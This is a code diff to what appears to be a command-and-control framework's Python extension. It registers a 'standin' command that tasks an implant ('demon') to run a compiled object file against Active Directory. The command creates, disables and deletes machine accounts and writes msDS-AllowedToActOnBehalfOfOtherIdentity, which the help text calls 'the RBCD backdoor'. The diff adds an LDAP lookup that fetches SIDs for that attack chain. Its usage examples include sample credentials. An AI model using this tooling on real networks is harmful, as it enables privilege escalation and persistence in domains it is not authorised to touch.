@@ -37,6 +37,7 @@ def standin_cmd(demonID, *param):
 
     flags = {
         "--computer": (str, ""),
+        "--object":   (str, ""),
         "--sid":      (str, ""),
         "--domain":   (str, ""),
         "--user":     (str, ""),
@@ -48,13 +49,13 @@ def standin_cmd(demonID, *param):
         return False
 
     computer = values["--computer"]
+    obj      = values["--object"]
     sid      = values["--sid"]
     domain   = values["--domain"]
     user     = values["--user"]
     passw    = values["--pass"]
 
-    # Determine the operation from the boolean flags.
-    bools = [p for p in param if p == "--make" or p == "--disable" or p == "--delete" or p == "--remove"]
+    bools = [p for p in param if p in ("--make", "--disable", "--delete", "--remove")]
     if "--make" in bools:
         mode, opname = 0, "create machine account"
     elif "--disable" in bools:
@@ -65,19 +66,25 @@ def standin_cmd(demonID, *param):
         mode, opname = 3, "set msDS-AllowedToActOnBehalfOfOtherIdentity"
     elif "--remove" in bools:
         mode, opname = 4, "remove msDS-AllowedToActOnBehalfOfOtherIdentity"
+    elif obj:
+        mode, opname = 5, "fetch object SID"
     else:
         demon.ConsoleWrite(demon.CONSOLE_ERROR,
             "Usage:\n"
-            "  standin --computer <name> --make\n"
-            "  standin --computer <name> --disable\n"
-            "  standin --computer <name> --delete\n"
-            "  standin --computer <name> --sid <SID>\n"
-            "  standin --computer <name> --remove\n"
+            "  standin --computer <name> --make | --disable | --delete | --sid <SID> | --remove\n"
+            "  standin --object <ldap-filter>\n"
             "  [--domain <d> --user <u> --pass <p>]")
         return False
 
-    if not computer:
-        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--computer is required")
+    # For --object, the LDAP filter rides in the 'computer' slot.
+    if mode == 5:
+        target = obj
+    else:
+        target = computer
+
+    if not target:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR,
+                           "--computer (or --object for a filter) is required")
         return False
 
     if mode == 3 and not sid:
@@ -85,13 +92,13 @@ def standin_cmd(demonID, *param):
         return False
 
     packer.addint(mode)
-    packer.addstr(computer)
+    packer.addstr(target)
     packer.addstr(sid)
     packer.addstr(domain)
     packer.addstr(user)
     packer.addstr(passw)
 
-    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {opname} '{computer}'")
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {opname} '{target}'")
     demon.InlineExecute(TaskID, "go", "bin/standin.x64.o", packer.getbuffer(), False)
     return TaskID
 
@@ -114,6 +121,9 @@ STANDIN_HELP = (
     "      the allowed-to-act right (the RBCD backdoor).\n"
     "  standin --computer <name> --remove\n"
     "      Clear msDS-AllowedToActOnBehalfOfOtherIdentity.\n"
+    "  standin --object <ldap-filter>\n"
+    "      Resolve an LDAP filter and print sAMAccountName + objectSid\n"
+    "      (use it to get the SID of a machine account you just --make'd).\n"
     "\n"
     "OPTIONAL (alternate credentials / target domain):\n"
     "  --domain <d>  Domain (NetBIOS or DNS). Selects the DC; with --user/\n"
@@ -123,13 +133,14 @@ STANDIN_HELP = (
     "\n"
     "EXAMPLES:\n"
     "  standin --computer Innsmouth --make\n"
-    "  standin --computer Innsmouth --make --domain redhook --user RFludd --pass 'Cl4vi$Alchemi4e'\n"
+    "  standin --object samaccountname=Innsmouth$\n"
+    "  standin --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543-2611\n"
+    "  standin --computer Providence --remove\n"
     "  standin --computer Arkham --disable\n"
     "  standin --computer Danvers --delete\n"
-    "  standin --computer Providence --sid S-1-5-21-1085031214-1563985344-725345543\n"
-    "  standin --computer Miskatonic --remove\n"
+    "  standin --computer Innsmouth --make --domain redhook --user RFludd --pass 'Cl4vi$Alchemi4e'\n"
 )
 
 RegisterCommand(standin_cmd, "", "standin", STANDIN_HELP, 0,
-                "--computer <name> (--make|--disable|--delete|--sid <SID>|--remove)",
+                "--computer <name> (...) | --object <ldap-filter>",
                 "--computer Innsmouth --make")
